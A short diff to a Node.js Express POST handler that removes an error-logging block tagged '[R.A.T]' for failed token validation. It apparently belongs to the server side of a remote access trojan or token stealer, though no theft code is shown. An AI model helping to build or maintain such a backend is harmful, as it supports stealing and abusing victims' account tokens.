@@ -194,11 +194,6 @@ app.post("/", (req, res) => {
         }
     }
 
-    .catch(err => {
-        //could happen if the auth server is down OR if invalid information is passed in the body
-        console.log(`[R.A.T] Error while validating token:\n${err}`)
-    })
-
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
